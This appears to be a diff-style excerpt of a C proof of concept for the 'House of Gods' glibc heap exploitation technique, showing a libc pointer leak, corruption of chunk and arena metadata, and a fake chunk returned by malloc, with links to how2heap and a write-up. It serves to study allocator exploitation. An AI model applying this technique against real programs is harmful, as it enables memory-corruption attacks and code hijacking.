@@ -1,0 +1,30 @@
+85   void *SMALLCHUNK = malloc(0x88);
+91   void *FAST20 = malloc(0x18);
+97   void *FAST40 = malloc(0x38);
+112  free(SMALLCHUNK);
+119  const uint64_t leak = *((uint64_t*) SMALLCHUNK);
+130  void *INTM = malloc(0x98);
+155  SMALLCHUNK = malloc(0x88);
+162  free(SMALLCHUNK);
+171  *((uint64_t*) (SMALLCHUNK + 0x8)) = leak + 0x7f8;
+199  *((uint64_t*) (FAST40 + 0x8)) = (uint64_t) (INTM - 0x10);
+204  free(FAST20);
+209  free(FAST40);
+223  void *BINMAP = malloc(0x1f8);
+272  *((uint64_t*) (INTM + 0x8)) = leak - 0xa20;
+281  *((uint64_t*) (BINMAP + 0x20)) = 0xffffffffffffffff;
+296  INTM = malloc(0x98);
+314  *((uint64_t*) (BINMAP + 0x8)) = (uint64_t) (INTM - 0x10);
+324  malloc(0xffffffffffffffbf + 1);
+331  malloc(0xffffffffffffffbf + 1);
+341  uint64_t fakechunk[4] = {
+       0x0000000000000000, 0x0000000000000073,
+       0x4141414141414141, 0x0000000000000000
+     };
+350  *((uint64_t*) (INTM + 0x20)) = (uint64_t) (fakechunk);
+361  void *FAKECHUNK = malloc(0x68);
+371  *((uint64_t*) (FAKECHUNK)) = 0x4242424242424242;
+378  assert(fakechunk[2] == 0x4242424242424242);
+
+https://github.com/shellphish/how2heap/blob/master/glibc_2.24/house_of_gods.c
+https://github.com/Milo-D/house-of-gods/blob/master/rev2/HOUSE_OF_GODS.TXT
